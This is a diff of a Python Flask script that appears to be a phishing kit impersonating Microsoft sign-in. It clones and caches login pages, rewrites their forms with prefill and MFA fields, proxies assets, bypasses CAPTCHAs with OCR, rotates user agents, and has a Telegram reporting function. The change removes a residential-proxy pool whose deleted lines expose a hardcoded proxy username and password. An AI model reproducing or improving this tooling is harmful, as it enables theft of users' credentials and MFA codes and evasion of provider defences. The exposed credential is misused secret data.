@@ -21,19 +21,14 @@ CACHE_DIR = "/tmp/mslogin_cache"
 ASSET_CACHE_DIR = "/tmp/asset_cache"
 os.makedirs(CACHE_DIR, exist_ok=True)
 os.makedirs(ASSET_CACHE_DIR, exist_ok=True)
-CACHE_TTL = 21600  # 6 hours
+CACHE_TTL = 86400  # 24 hours
 
 HOME_DIR = os.path.expanduser("~")
 BASE_CACHE_PATH = os.path.join(HOME_DIR, "AppData", "Local", "SysRunCache")
 os.makedirs(BASE_CACHE_PATH, exist_ok=True)
 
 # === PROXY CONFIG ===
-PROXIES = [
-    {
-        "http": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335",
-        "https": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335"
-    },
-]
+PROXIES = []  # Empty disables proxies
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -48,7 +43,7 @@ S3_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY_ID")
 S3_SECRET_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")
 
 def get_random_proxy():
-    return random.choice(PROXIES) if PROXIES else None
+    return None  # Always disables proxy use
 
 def send_telegram_message(message):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -97,11 +92,11 @@ def setup_chrome_options(profile_dir=None):
     return chrome_options
 
 # === CAPTCHA SOLVER (OCR) ===
-def solve_captcha_with_ocr(image_url, proxy=None):
+def solve_captcha_with_ocr(image_url):
     try:
         import pytesseract
         headers = {"User-Agent": random.choice(USER_AGENTS)}
-        resp = requests.get(image_url, headers=headers, proxies=proxy, timeout=10)
+        resp = requests.get(image_url, headers=headers, timeout=10)
         img = Image.open(io.BytesIO(resp.content))
         text = pytesseract.image_to_string(img).strip()
         return text
@@ -109,7 +104,7 @@ def solve_captcha_with_ocr(image_url, proxy=None):
         print(f"[ERROR] CAPTCHA OCR failed: {e}")
         return None
 
-# === FETCH LOGIN PAGE WITH PROXY + FALLBACK + CAPTCHA DETECT ===
+# === FETCH LOGIN PAGE WITHOUT PROXY + FALLBACK + CAPTCHA DETECT ===
 def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
     cache_path = os.path.join(CACHE_DIR, cache_key)
     now = time.time()
@@ -118,12 +113,11 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
             return f.read()
 
     headers = {"User-Agent": random.choice(USER_AGENTS)}
-    proxy = get_random_proxy()
     time.sleep(random.uniform(1, 2))
 
     try:
-        print(f"[DEBUG] Fetching {url} with proxy {proxy}")
-        resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
+        print(f"[DEBUG] Fetching {url} without proxy")
+        resp = requests.get(url, headers=headers, timeout=10)
         print(f"[DEBUG] Response status: {resp.status_code}")
         print(f"[DEBUG] Response headers: {resp.headers}")
         if "Access Denied" in resp.text or resp.status_code != 200:
@@ -138,7 +132,7 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
             captcha_src = captcha_img["src"]
             if not captcha_src.startswith("http"):
                 captcha_src = urljoin(url, captcha_src)
-            captcha_value = solve_captcha_with_ocr(captcha_src, proxy)
+            captcha_value = solve_captcha_with_ocr(captcha_src)
             if captcha_value:
                 captcha_input = soup.find("input", {"name": "captcha"})
                 if captcha_input:
@@ -232,7 +226,7 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
                 tag[attr] = "/asset-proxy?url=" + quote(val, safe='')
     return str(soup)
 
-# === ASSET PROXY WITH CACHING + PROXY ===
+# === ASSET PROXY WITH CACHING (NO PROXY) ===
 @app.route('/asset-proxy')
 def asset_proxy():
     import mimetypes
@@ -255,10 +249,9 @@ def asset_proxy():
         return response
 
     headers = {"User-Agent": random.choice(USER_AGENTS)}
-    proxy = get_random_proxy()
     try:
-        print(f"[DEBUG] Fetching asset {url} with proxy {proxy}")
-        resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
+        print(f"[DEBUG] Fetching asset {url} without proxy")
+        resp = requests.get(url, headers=headers, timeout=10)
         print(f"[DEBUG] Asset response status: {resp.status_code}")
         content_type = resp.headers.get('Content-Type') or mimetypes.guess_type(url)[0] or 'application/octet-stream'
         with open(cache_path, "wb") as f:
